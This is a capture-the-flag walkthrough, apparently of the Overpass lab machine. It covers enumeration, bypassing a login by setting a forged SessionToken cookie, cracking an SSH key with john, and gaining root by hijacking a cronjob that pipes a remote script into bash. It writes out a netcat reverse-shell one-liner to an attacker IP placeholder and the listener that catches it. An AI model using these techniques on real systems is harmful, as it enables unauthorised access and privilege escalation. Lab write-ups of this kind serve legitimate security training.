Start off with an nmap scan.

`nmap -sC -sV -O 10.10.151.177`

Port 22 and 80 are open running SSH and HTTP services respectively.

Let's check the website out first. There's some links we can click on but let's also enumerate using dirb just for completeness sake.

`dirb http://10.10.151.177 /usr/share/wordlists/dirb/big.txt` and ``dirb http://10.10.151.177 /usr/share/wordlists/dirb/big.txt` -X .php`

Looks like there's nothing hidden. Let's head into the downloads directory and see what we can find.

I'll download the source code and build script, maybe there's some hard-coded credentials inside.

Nothing really stands out to me so far, and the hint says that we're specifically looking for an OWASP top 10 vulnerability to gain an initial foothold.

The service versions don't appear to be exploitable by a relevant vulnerability either.

Kind of stumped here so let's retrace our steps and see if we missed anything. The other two directories were /css and /img, the /css directory contains an interesting file called "login.css"

If we open "login.css" it just looks like it loads a simple table, but there's an element that says:

> #loginStatus {
>    color: red;

The css isn't loaded by the page, we can verify this using the dev tools and checking the network tab. I tried to edit the html to load "login.css" instead of "main.css" but that doesn't seem to get us anywhere.

Let's run our dirb scan again, this time checking for html pages...

We found an admin panel at http://10.10.151.177/admin.html

Progress!

Again, we're not supposed to brute-force. So let's see if it's vulnerable to any SQL injection. We'll use Burp to help us out.

We tested various methods to try and prove that it's vulnerable to SQLi, but no dice.

We notice from the page source that there is now a "login.js" script being loaded. Let's check its contents for any clues.

This looks interesting:

```  if (statusOrCookie === "Incorrect credentials") {
        loginStatus.textContent = "Incorrect Credentials"
        passwordBox.value=""
    } else {
        Cookies.set("SessionToken",statusOrCookie)
        window.location = "/admin"```

This code checks a value stored in "loginStatus" for the text "Incorrect Credentials". If it matches that value, then it denies us entry. We need to modify the value of "statusOrCookie" so we can trigger the else condition of this function. (At least this is what I gathered from the snippet, I have the coding skills of a hamster)

The cookies name is "SessionToken". Let's input `Cookies.set("SessionToken", "test")` in the dev tools>storage>cookies section of firefox and then refresh the page.

**NOTE: I couldn't get this to work without changing the URL from /admin.html to /admin ... I don't know why but it was pretty frustrating.**

Refreshing the page shows us an RSA key for "James". We can steal it, crack it with John, and then use those creds to log in to the users session.

`/opt/john/ssh2john.py ssh.txt > ssh.hash`

`john ssh.hash`

Now let's login

`ssh -i ssh.txt james@10.10.198.26`

Enter the passphrase that john cracked.

Grab the user flag, and check out the other file on the desktop "todo.txt"

A quick `sudo -l` tells us we need a sudo password if we want to escalate our privileges via a LOLBIN. 

Checking the contents of /etc/shadow tells us we don't have permission to see it.

We can however see /etc/passwd and checking the crontan also yields some interesting information.

> * * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash

Looks like we have a bash script that's running as root.

The script downloads "buildscript.sh" from the website. Unfortunately we don't have write permissions to crontab, but notice how it's using "overpass.thm" instead of the machine IP. This means that there's an entry in the hosts file that makes this possible. Let's edit the hosts file and redirect the request to our machine.


We'll need to setup a python webserver on our attackbox for this and setup a directory structure on our machine that's identical to the cronjob.

Unfortunately, port 80 is already in use on the attackbox (since we're using the browser) and we can't change the port in the hosts file. We'll need to set up a reverse proxy. After some googling, I found that `nginx` can help us out with this. Let's install it and then create a file called "overpass.thm" at `/etc/nginx/conf.d`

The file will contain:

```server {

    listen 80;
    server_name overpass.thm;
    location / {
        proxy_pass http://127.0.0.1:8081/;
    }
}
```

Now, when the target sends a request to our machine on port 80, it'll be forwarded to port 8080 which is where we will set up the python webserver. Don't forget to create a "buildscript.sh" inside /downloads/src which is where we will put our netcat shell spawning script.

`rm -f /tmp/a; mkfifo /tmp/a; nc <Attackbox IP> 4444 0</tmp/a | /bin/sh >/tmp/a 2>&1; rm /tmp/a `

setup our python3 webserver...

`python3 -m http.server 8081`

and finally...set up our netcat listener to catch she shell.

`nc -lvnp 4444`








